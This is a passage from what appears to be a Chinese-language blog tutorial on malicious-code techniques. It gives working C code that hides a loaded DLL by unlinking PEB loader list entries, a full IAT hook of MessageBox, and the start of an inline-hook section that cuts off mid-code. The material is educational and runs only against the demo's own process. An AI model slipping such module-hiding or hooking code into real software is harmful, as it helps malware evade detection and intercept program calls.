Header;</span></span><br><span class="line">Header-&gt;Flink = Header-&gt;Blink = Header;</span><br><span class="line">Header = &amp;(ldr-&gt;InInitializationOrderModuleList);</span><br><span class="line">Header-&gt;Flink = Header-&gt;Blink = Header;</span><br><span class="line">Header = &amp;(ldr-&gt;InMemoryOrderModuleList);</span><br><span class="line">Header-&gt;Flink = Header-&gt;Blink = Header;</span><br></pre></td></tr></table></figure>



<p>断链前：</p>
<img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210301190421368.png" alt="image-20210301190421368" style="zoom:80%;" align="left">



<p>断链后：</p>
<img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210301185116072.png" alt="image-20210301185116072" align="left">

<p>可以看到，使用 <code>LoadPE</code> 并未遍历到任何模块！</p>
<h4 id="隐藏特定模块"><a href="#隐藏特定模块" class="headerlink" title="隐藏特定模块"></a>隐藏特定模块</h4><p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Locale.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核Unicode字符串结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ldr, 进程信息表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	DWORD Length;</span><br><span class="line">	<span class="keyword">bool</span> Initialized;</span><br><span class="line">	PVOID SsHandle;</span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ldte, 模块信息表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">	<span class="keyword">void</span>* BaseAddress;</span><br><span class="line">	<span class="keyword">void</span>* EntryPoint;</span><br><span class="line">	ULONG SizeOfImage;</span><br><span class="line">	UNICODE_STRING FullDllName;</span><br><span class="line">	UNICODE_STRING BaseDllName;</span><br><span class="line">	ULONG Flags;</span><br><span class="line">	SHORT LoadCount;</span><br><span class="line">	SHORT TlsIndex;</span><br><span class="line">	HANDLE SectionHandle;</span><br><span class="line">	ULONG CheckSum;</span><br><span class="line">	ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_wsetlocale(LC_ALL, <span class="string">L&quot;chs&quot;</span>);</span><br><span class="line">	PPEB_LDR_DATA ldr;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY ldte;</span><br><span class="line"></span><br><span class="line">	__asm&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		mov eax, fs: [<span class="number">0x30</span>] <span class="comment">// PEB </span></span><br><span class="line">		mov ecx, [eax + <span class="number">0x0c</span>] <span class="comment">// LDR</span></span><br><span class="line">		mov ldr, ecx</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">	&#125;</span><br><span class="line">	PLIST_ENTRY Header = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">	PLIST_ENTRY Cur = Header;</span><br><span class="line">	HMODULE hModule = GetModuleHandle(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line">	<span class="keyword">do</span> </span><br><span class="line">	&#123;</span><br><span class="line">		ldte = CONTAINING_RECORD(Cur, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);</span><br><span class="line">		<span class="keyword">if</span> (ldte-&gt;BaseAddress == hModule)</span><br><span class="line">		&#123;</span><br><span class="line">			Cur-&gt;Blink-&gt;Flink = Cur-&gt;Flink;</span><br><span class="line">			Cur-&gt;Flink-&gt;Blink = Cur-&gt;Blink;</span><br><span class="line">			<span class="comment">/*ldte-&gt;InLoadOrderModuleList.Blink-&gt;Flink = ldte-&gt;InLoadOrderModuleList.Flink;</span></span><br><span class="line"><span class="comment">			ldte-&gt;InLoadOrderModuleList.Flink-&gt;Blink = ldte-&gt;InLoadOrderModuleList.Blink;*/</span></span><br><span class="line">		&#125;</span><br><span class="line">		Cur = Cur-&gt;Blink;</span><br><span class="line">	&#125; <span class="keyword">while</span> (Header != Cur);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	Header = &amp;(ldr-&gt;InInitializationOrderModuleList);</span><br><span class="line">	Cur = Header;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		ldte = CONTAINING_RECORD(Cur, LDR_DATA_TABLE_ENTRY, InInitializationOrderModuleList);</span><br><span class="line">		<span class="keyword">if</span> (ldte-&gt;BaseAddress == hModule)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/*Cur-&gt;Blink-&gt;Flink = Cur-&gt;Flink;</span></span><br><span class="line"><span class="comment">			Cur-&gt;Flink-&gt;Blink = Cur-&gt;Blink;*/</span></span><br><span class="line">		&#125;</span><br><span class="line">		Cur = Cur-&gt;Blink;</span><br><span class="line">	&#125; <span class="keyword">while</span> (Header != Cur);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	Header = &amp;(ldr-&gt;InMemoryOrderModuleList);</span><br><span class="line">	Cur = Header;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		ldte = CONTAINING_RECORD(Cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList);</span><br><span class="line">		<span class="keyword">if</span> (ldte-&gt;BaseAddress == hModule)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/*Cur-&gt;Blink-&gt;Flink = Cur-&gt;Flink;</span></span><br><span class="line"><span class="comment">			Cur-&gt;Flink-&gt;Blink = Cur-&gt;Blink;*/</span></span><br><span class="line">		&#125;</span><br><span class="line">		Cur = Cur-&gt;Blink;</span><br><span class="line">	&#125; <span class="keyword">while</span> (Header != Cur);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>断链前：</p>
<img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210301190421368.png" alt="image-20210301190421368" style="zoom:80%;" align="left">



<p>断链后：</p>
<img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210301192128733.png" alt="image-20210301192128733" style="zoom:80%;" align="left">





<h2 id="Hook"><a href="#Hook" class="headerlink" title="Hook"></a>Hook</h2><p><code>Hook</code> 技术，即实现改变进程的执行逻辑，可以实现进程跳转到目标代码段执行，执行完毕后跳转回原 <code>EIP</code> 执行。</p>
<p>实现思路：</p>
<ul>
<li>改变原程序线程的执行逻辑，执行完目标代码后，跳转回原 <code>EIP</code> </li>
<li>创建新的线程，并赋予线程 <code>EIP</code> ，执行逻辑代码</li>
</ul>
<p><code>Hook</code> 技术的作用：</p>
<ol>
<li>监控进程行为</li>
<li>改变进程行为</li>
</ol>
<h3 id="IAT-Hook"><a href="#IAT-Hook" class="headerlink" title="IAT Hook"></a>IAT Hook</h3><p>在程序执行前，<code>PE</code> 中的 <code>IAT</code> 表中存储的是指向函数的函数名；当程序真正加载时，操作系统才会将函数地址更新并修改 <code>IAT</code> 表，此时的 <code>IAT</code> 表中存储的是函数的地址。由于 <code>dll</code> 程序加载时，可能存在其加载地址和 <code>ImageBase</code> 不同，而且并不是 <code>dll</code> 中所有的函数都会被使用。因此，指在函数被调用时更新其函数地址，更加高效和安全。</p>
<p><code>IAT Hook</code> 的思想就是，将 <code>IAT</code> 表中的函数地址进行修改，指向我们自己编写的函数地址。我们在自己编写的函数中再调用被篡改的函数，以实现该程序功能的正常实现。我们可以在自己的函数中实现监控该程序调用被 <code>Hook</code> 的函数的参数、返回值，修改其参数和返回值，以达到特殊的目的。</p>
<p><strong>需要注意哪些坑？</strong></p>
<ul>
<li><code>int WINAPI MyFuncProc(HWND hWnd,LPSTR lpText,LPSTR lpCaption,UINT uType)</code></li>
</ul>
<p>在自定义的函数 <code>MyFuncProc</code> 中，当不声明该函数使用的时 <code>_stdcall</code> 时，会发生堆栈平衡错误！</p>
<p><img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210220175317746.png" alt="image-20210220175317746"></p>
<ul>
<li><p>直接使用函数地址调用函数时，需要做函数声明！</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *PFUNC)</span><span class="params">(HWND,LPSTR,LPSTR,UINT)</span></span>;</span><br><span class="line">PFUNC pfunc = (PFUNC)srcFuncAddr;</span><br><span class="line">pfunc(<span class="literal">NULL</span>, <span class="string">&quot;这是被IAT HOOK后的MessageBox！&quot;</span>, <span class="string">&quot;提示&quot;</span>, MB_OK);</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong><code>IAT Hook</code> 有哪些局限性？</strong></p>
<p>由于 <code>IAT Hook</code> 的本质就是修改 <code>IAT</code> 表中的函数地址，以实现函数功能的监控。而 <code>IAT</code> 表中的函数是通过静态调用的方式实现的，而通过 <code>LoadLibrary</code> 的方式获取函数地址，这样便不会记录在 <code>IAT</code> 表中，此时 <code>IAT Hook</code> 便无法实现。</p>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">LPVOID srcFuncAddr;</span><br><span class="line">LPVOID lpImageBuff;</span><br><span class="line">DWORD fileSize;</span><br><span class="line">PIMAGE_DOS_HEADER pDosHeader;</span><br><span class="line">PIMAGE_FILE_HEADER pPEHeader;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER32 pOptionalHeader;</span><br><span class="line">PIMAGE_SECTION_HEADER pSectionHeader;</span><br><span class="line">PIMAGE_DATA_DIRECTORY dataDir;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *PFUNC)</span><span class="params">(HWND,LPSTR,LPSTR,UINT)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetPEHeader</span><span class="params">(LPVOID pImageBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//	printf(&quot;\n*******************PE解析********************\n&quot;);</span></span><br><span class="line"></span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class="line">	<span class="comment">//判断是否是有效的MZ标志	</span></span><br><span class="line">	<span class="keyword">if</span> (*((PWORD)pImageBuffer) != IMAGE_DOS_SIGNATURE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;不是有效的PE文件！\n正在退出PE解析...\n&quot;</span>);</span><br><span class="line">		<span class="comment">//		free(pImageBuffer);</span></span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	pPEHeader = (PIMAGE_FILE_HEADER)((DWORD)pDosHeader + (DWORD)pDosHeader-&gt;e_lfanew + <span class="number">4</span>);</span><br><span class="line">	pOptionalHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pPEHeader + <span class="keyword">sizeof</span>(IMAGE_FILE_HEADER));</span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionalHeader + pPEHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	<span class="comment">//指向首个目录表, 即导出表</span></span><br><span class="line">	dataDir = (PIMAGE_DATA_DIRECTORY)((DWORD)pOptionalHeader + <span class="number">0x60</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">VOID <span class="title">IATHook</span><span class="params">(LPVOID srcFuncAddr, LPVOID dstFuncAddr, BOOL isSet)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE hModule;</span><br><span class="line">	PIMAGE_IMPORT_BY_NAME importByName;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//获取ImageBuffer的信息</span></span><br><span class="line">	GetPEHeader(lpImageBuff);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//指向导入表</span></span><br><span class="line">	dataDir += <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span> (dataDir != <span class="number">0x00</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		PIMAGE_IMPORT_DESCRIPTOR importDir = (PIMAGE_IMPORT_DESCRIPTOR)(dataDir-&gt;VirtualAddress + (DWORD)lpImageBuff);</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*遍历导入表*/</span></span><br><span class="line">		<span class="keyword">while</span> (*(DWORD*)importDir != <span class="number">0x0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">/*遍历FirstThunk*/</span></span><br><span class="line">			DWORD* pFirstThunk = (DWORD*)(importDir-&gt;FirstThunk + (DWORD)lpImageBuff);</span><br><span class="line"></span><br><span class="line">			<span class="comment">//判断IAT表是否已经绑定</span></span><br><span class="line">			BOOL isBind = (importDir-&gt;TimeDateStamp == <span class="number">0</span>) ? FALSE : TRUE;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">while</span> (!isBind)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="comment">//判断FirstThunk是否结束</span></span><br><span class="line">				<span class="keyword">if</span> (*pFirstThunk == <span class="number">0x00</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">				<span class="comment">//获取导入表DLL名</span></span><br><span class="line">				LPSTR lpszNameOfDll = (LPSTR)(importDir-&gt;Name + (DWORD)lpImageBuff);</span><br><span class="line">				<span class="comment">//加载DLL模块</span></span><br><span class="line">				hModule = LoadLibraryA(lpszNameOfDll);</span><br><span class="line"></span><br><span class="line">				DWORD FirstThunk = *pFirstThunk;</span><br><span class="line">				<span class="comment">//判断OriginalFirstThunk是否指向函数名</span></span><br><span class="line">				<span class="keyword">if</span> (FirstThunk &gt;&gt; <span class="number">31</span> != <span class="number">0x01</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">if</span> (FirstThunk == (DWORD)srcFuncAddr || FirstThunk == (DWORD)dstFuncAddr)</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="comment">//设置Hook</span></span><br><span class="line">						<span class="keyword">if</span> (isSet)</span><br><span class="line">						&#123;</span><br><span class="line">							*pFirstThunk = (DWORD)dstFuncAddr;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="comment">//卸载Hook</span></span><br><span class="line">						<span class="keyword">else</span></span><br><span class="line">						&#123;</span><br><span class="line">							<span class="comment">//DWORD* FirstThunkOfINT = (DWORD*)(importDir-&gt;OriginalFirstThunk + (DWORD)lpImageBuff);</span></span><br><span class="line">							<span class="comment">//importByName = (PIMAGE_IMPORT_BY_NAME)(*FirstThunkOfINT + (DWORD)lpImageBuff);</span></span><br><span class="line">							<span class="comment">//printf(&quot;%s\n&quot;, (CHAR*)importByName-&gt;Name);</span></span><br><span class="line">							<span class="comment">//*pFirstThunk = (DWORD)GetProcAddress(hModule, (CHAR*)importByName-&gt;Name);</span></span><br><span class="line">							*pFirstThunk = (DWORD)srcFuncAddr;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				pFirstThunk++;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			importDir++;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyFuncProc</span><span class="params">(HWND hWnd,LPSTR lpText,LPSTR lpCaption,UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MessageBox参数如下：\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hWnd: %x, lpText: %s, lpCaption: %s, uType: %u\n&quot;</span>, hWnd, lpText, lpCaption, uType);</span><br><span class="line">	PFUNC pfunc = (PFUNC)srcFuncAddr;</span><br><span class="line">	pfunc(<span class="literal">NULL</span>, <span class="string">&quot;这是被IAT HOOK后的MessageBox！&quot;</span>, <span class="string">&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	srcFuncAddr = MessageBox;</span><br><span class="line">	<span class="comment">//获取PE信息</span></span><br><span class="line">	lpImageBuff = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//设置IAT Hook</span></span><br><span class="line">	IATHook(srcFuncAddr, MyFuncProc, TRUE);</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;设置IAT Hook!&quot;</span>, <span class="string">&quot;提示&quot;</span>, MB_OK);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//卸载IAT HOOk</span></span><br><span class="line">	IATHook(srcFuncAddr, MyFuncProc, FALSE);</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;卸载IAT HOOk!&quot;</span>, <span class="string">&quot;提示&quot;</span>, MB_OK);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>效果图如下：</p>
<img src="/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81/image-20210220175805788.png" alt="image-20210220175805788" style="zoom: 67%;" align="left">





<h3 id="Inline-Hook"><a href="#Inline-Hook" class="headerlink" title="Inline Hook"></a>Inline Hook</h3><p>所谓 <code>InlineHook</code> 的本质就是添加或修改程序函数中的汇编指令（如 <code>jmp、call</code> 指令），以实现程序逻辑改变造成跳转，即 <code>Shellcode</code> 注入。当执行完目标函数后，在将程序 <code>EIP</code> 跳转后原代码处，以避免影响原程序的正常功能。</p>
<p>需要注意的是，当程序开始在操作系统中加载运行时，其不同段的属性已经被设置，如代码段为可读可执行但不可写，而数据段则只允许读写而不允许执行等。<strong>需要通过 <code>API</code> 函数 <code>VirtualProtect</code> 将目标代码段的属性设置为可读可写可执行，才能实现修改进程代码段，否则写命令将会被拒绝，从而引起读写错误异常。</strong></p>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 